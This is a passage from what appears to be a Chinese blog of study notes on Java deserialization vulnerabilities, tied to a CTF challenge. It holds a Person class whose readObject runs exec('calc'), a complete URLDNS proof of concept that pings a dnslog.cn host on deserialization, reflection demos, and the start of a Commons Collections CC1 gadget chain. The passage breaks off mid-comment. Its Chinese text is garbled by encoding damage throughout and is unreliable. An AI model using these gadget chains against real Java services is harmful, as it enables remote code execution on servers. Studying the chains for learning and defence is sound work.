+</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//é‡æ–°å¯¹readObjectå‡½æ•°è¿›è¡Œé‡å†™ï¼Œç„¶ååœ¨é‡Œé¢åŠ ä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ï¼Œè¿™æ ·çš„è¯å°±ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæ‰§è¡Œï¼Œè¿™æ ·çš„è¯å°±ä¼šé€ æˆå®‰å…¨é—®é¢˜</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec ç”¨äºè°ƒç”¨å¤–éƒ¨å¯æ‰§è¡Œç¨‹åºæˆ–ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UnserializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span>ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–çš„è¯ä¼šæŠŠå¯¹è±¡å˜æˆå­—èŠ‚åºåˆ—(å­—ç¬¦ä¸²æˆ–è€…äºŒè¿›åˆ¶æ–‡ä»¶)</span></span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ä¸ºä»€ä¹ˆjavaååºåˆ—åŒ–ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ</p><p>åªè¦æœåŠ¡ç«¯ä¼šååºåˆ—åŒ–æ•°æ®çš„è¯ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p><p><strong>å¯èƒ½çš„å½¢å¼</strong></p><p>1.<strong>å…¥å£ç±»</strong>çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</p><p>(1   è¿™é‡Œçš„è¯å°±æ˜¯å¯¹personç±»é‡Œçš„readObjectå‡½æ•°è¿›è¡Œé‡å†™ï¼Œç„¶ååœ¨é‡Œé¢åŠ ä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„è¯­å¥)</p><p>2.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨ã€‚</p><p>3.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–åˆå±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨</p><p>æ¯”å¦‚ç±»å‹å®šä¹‰ä¸ºObject,è°ƒç”¨equals/hashcode/toString</p><p>é‡ç‚¹ ç›¸åŒç±»å‹ åŒåå‡½æ•°</p><p>(2   3éƒ½æ˜¯ç±»ä¼¼å¥—å¨ƒä¸€æ ·çš„ï¼Œä¸€å±‚å¥—ä¸€å±‚çš„ç±»)</p><p>4.æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</p><p>1.å…±åŒæ¡ä»¶ ç»§æ‰¿Serializable</p><p>2.å…¥å£ç±»æ¡ä»¶ source(é‡å†™readObject å‚æ•°ç±»å‹å¹¿æ³› æœ€å¥½jdkè‡ªå¸¦) â€”-&gt;  Map HashMap  HashTable   <a href="https://zhuanlan.zhihu.com/p/84533476">HashMapä¸ºä»€ä¹ˆè¦é‡å†™readObject</a></p><p>3.è°ƒç”¨é“¾ gadget chain  <strong>ç›¸åŒåç§° ç›¸åŒç±»å‹</strong></p><p>4.æ‰§è¡Œç±» sink (rce ssrf å†™æ–‡ä»¶ç­‰ç­‰)</p><p>è¿™é‡Œçš„è¯æˆ‘æ˜¯æ ¹æ®è¿™ä¸¤ç¯‡æ–‡ç« æ¥çœ‹ç€è·Ÿè¿›çš„ <a href="https://blog.csdn.net/qq_47886905/article/details/123531299">æ–‡ç« 1</a> <a href="https://blog.csdn.net/cosmoslin/article/details/122838465">æ–‡ç« 2</a> <a href="https://www.anquanke.com/post/id/201762">æ–‡ç« ä¸‰</a></p><p><strong>è¿™ä¸¤ç¯‡æ–‡ç« ä¸­å†™çš„putå‡½æ•°æ–¹æ³•ï¼Œputå‡½æ•°é‡Œçš„ä¸œè¥¿å°±æœ‰putValå‡½æ•°ï¼Œç„¶åè¿™æ—¶å€™å°±ä¼šè¿›è¡Œdnsè¯·æ±‚ï¼Œç„¶åhashcodeå€¼å°±ä¼šè¢«æ”¹å˜ï¼Œå¯¼è‡´æœ€åreadObjecté‡Œçš„hash(key)ä¸ä¼šè¿›è¡Œdnsè¯·æ±‚</strong></p><p>è¿™ä¸¤ç¯‡æ–‡ç« é‡Œæ˜¯åˆ©ç”¨javaçš„<strong>åå°„</strong>æ¥ä¿®æ”¹ hashcodeå€¼</p><p><a href="https://cloud.tencent.com/developer/article/1614318">åå°„çš„æ–‡ç« </a></p><p><strong>åå°„</strong></p><p>åå°„çš„ä½œç”¨ï¼šè®©javaå…·æœ‰åŠ¨æ€æ€§</p><p>ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„å±æ€§</p><p>åŠ¨æ€ç”Ÿæˆå¯¹è±¡</p><p>åŠ¨æ€è°ƒç”¨æ–¹æ³•</p><p>æ“ä½œå†…éƒ¨ç±»å’Œç§æœ‰æ–¹æ³•</p><p>åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­çš„åº”ç”¨ï¼š</p><p>å®šåˆ¶éœ€è¦çš„å¯¹è±¡</p><p>é€šè¿‡invokeè°ƒç”¨é™¤äº†åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•°</p><p>é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±»</p><p><strong>åå°„å­¦ä¹ å†™çš„ä»£ç </strong>  è§†é¢‘  <a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=bacfffe46b930fda5761b63367eb298c">åå°„</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//åå°„å°±æ˜¯æ“ä½œClass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä»åŸå‹classé‡Œé¢å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="comment">//c.newInstance(); --&gt; è¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸èƒ½ä¼ å‚çš„</span></span><br><span class="line">        c.getConstructor();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        <span class="comment">//System.out.println(p);</span></span><br><span class="line">        <span class="comment">//è·å–ç±»é‡Œé¢å±æ€§</span></span><br><span class="line">        <span class="comment">//Field[] personfiled = c.getFields(); //è¿™ä¸ªå‡½æ•°çš„è¯åªå¯ä»¥è·å–å…¬æœ‰å±æ€§ï¼Œç§æœ‰çš„ä¸è¡Œ</span></span><br><span class="line"><span class="comment">//        Field[] personfiled = c.getDeclaredFields();  //ç§æœ‰å’Œå…¬æœ‰éƒ½èƒ½è·å–</span></span><br><span class="line"><span class="comment">//        for(Field f:personfiled)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//          System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125; è¿™äº›éƒ½æ˜¯æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>); <span class="comment">//getField  å’Œ  getDeclaredFieldséƒ½ä¸èƒ½ä¿®æ”¹é‡Œè¾¹çš„å€¼ï¼Œå› ä¸ºæ˜¯ç§æœ‰å±æ€§</span></span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);  <span class="comment">//è¿™æ˜¯å…è®¸ä¿®æ”¹ç§æœ‰å±æ€§çš„å€¼</span></span><br><span class="line">        namefield.set(p,<span class="number">23</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">//        Method[] personmethod = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m:personmethod)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125; æŸ¥çœ‹è¿™ä¸ªç±»é‡Œ</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);<span class="comment">//å¦‚æœæŠŠpersonç±»é‡Œè¾¹çš„actionå‡½æ•°æ¢æˆprivate,é‚£å°±etDeclaredMethod,ç„¶åé€šè¿‡setAccessible(true);ä¿®æ”¹æƒé™</span></span><br><span class="line">            actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            actionmethod.invoke(p,<span class="string">&quot;ggaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>å­¦ä¹ ä¸­ç”¨åˆ°çš„ä»£ç </strong>(URLDNSçš„poc)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//0x01.ç”Ÿæˆpayload</span></span><br><span class="line">        <span class="comment">//è®¾ç½®ä¸€ä¸ªhashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//è®¾ç½®æˆ‘ä»¬å¯ä»¥æ¥å—DNSæŸ¥è¯¢çš„åœ°å€</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://3rzcpr.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//å°†URLçš„hashCodeå­—æ®µè®¾ç½®ä¸ºå…è®¸ä¿®æ”¹</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//**ä»¥ä¸‹çš„èœœæ±æ“ä½œæ˜¯ä¸ºäº†ä¸åœ¨putä¸­è§¦å‘URLDNSæŸ¥è¯¢ï¼Œå¦‚æœä¸è¿™ä¹ˆå†™å°±ä¼šè§¦å‘ä¸¤æ¬¡ï¼ˆä¹‹åä¼šè§£é‡Šï¼‰**</span></span><br><span class="line">        <span class="comment">//1. è®¾ç½®urlçš„hashCodeå­—æ®µä¸º0xdeadbeefï¼ˆéšæ„çš„å€¼ï¼‰</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. å°†urlæ”¾å…¥hashMapä¸­ï¼Œå³è¾¹å‚æ•°éšä¾¿å†™</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;rmb122&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¿®æ”¹urlçš„hashCodeå­—æ®µä¸º-1ï¼Œä¸ºäº†è§¦å‘DNSæŸ¥è¯¢ï¼ˆä¹‹åä¼šè§£é‡Šï¼‰</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.å†™å…¥æ–‡ä»¶æ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.è¯»å–æ–‡ä»¶ï¼Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦jdk8 æ¥è¿›è¡Œè¿è¡Œ</p><p><a href="https://github.com/bit4woo/code2sec.com/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C%EF%BC%9AJava%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java%20Reflection%EF%BC%89.md">githubä¸Šåå°„çš„è¯¦ç»†æ–‡ç« </a></p><p><strong>è¿™é‡Œçš„çŸ¥è¯†ç‚¹å¯¹åº”ç€web846</strong>   payloadå¯ä»¥å»çœ‹ç¾½å¸ˆå‚…å†™çš„åšå®¢</p><h2 id="ccé“¾"><a href="#ccé“¾" class="headerlink" title="ccé“¾"></a>ccé“¾</h2><p>jdkåŠ¨æ€ä»£ç†</p><p><a href="https://zhuanlan.zhihu.com/p/567962124">æ–‡ç« </a>   è¿™é‡Œå°±ä¸å¤šå†™äº†ï¼Œ  å› ä¸ºè¿™ç¯‡æ–‡ç« å·²ç»å†™çš„å¾ˆæ¸…æ¥šäº†    </p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=3&amp;vd_source=bacfffe46b930fda5761b63367eb298c">è§†é¢‘</a>  è¿™é‡Œçš„è¯æ˜¯è®²çš„å¾ˆæ˜ç™½äº†  è¿™é‡Œæœ‰å¾ˆå¤šéƒ½æ˜¯å¥—è·¯å†™æ³•</p><h3 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h3><p>è§†é¢‘è®²è§£   <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p><strong>cc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import jdk.internal.org.objectweb.asm.commons.Method;</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> sun.invoke.anon.AnonymousClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Object.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//ç®€å•å¼¹ä¸ªè®¡ç®—å™¨</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//ç”¨åå°„å¼¹ä¸ªè®¡ç®—å™¨</span></span><br><span class="line">        <span class="comment">// Runtime r = Runtime.getRuntime(); è¿™ä¸ªä¸èƒ½è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—é€šè¿‡åå°„è¿›è¡Œæ“ä½œ</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//åˆ©ç”¨ InvokerTransformerå¼¹ä¸ªè®¡ç®—å™¨</span></span><br><span class="line">        <span class="comment">//InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;key&quot;,&quot;value&quot;);  //å†™è¿™é‡Œçš„åŸå› æ˜¯ä¸ºäº†ä¸‹é¢çš„éå†</span></span><br><span class="line"><span class="comment">//        //åˆ©ç”¨Map.Entryçš„éå†é€šè¿‡setValueè°ƒç”¨checkSetValue</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line">        <span class="comment">//entry.setValue(r);//ç»™rçš„è¯ï¼Œé‚£ä¹ˆcheckSetValueé‡Œçš„valueå€¼ä¹Ÿæ˜¯rï¼Œæ‰€ä»¥ä¼šå¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//ä¸‹é¢æ˜¯å†™å¥½çš„é€šè¿‡åå°„æ¥è°ƒç”¨Runtime.getEuntime()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        //ä¸Šé¢çš„ä»£ç æ˜¯ä¸ºäº†æ›¿ä»£ä¸‹é¢çš„1</span></span><br><span class="line"><span class="comment">//       Runtime r =(Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//       //ä¸Šé¢çš„ä»£ç æ˜¯ä¸ºäº†æ›¿ä»£ä¸‹é¢çš„2</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"><span class="comment">//        //ä¸Šé¢çš„ä»£ç æ˜¯ä¸ºäº†æ›¿ä»£ä¸‹é¢çš„3</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å› 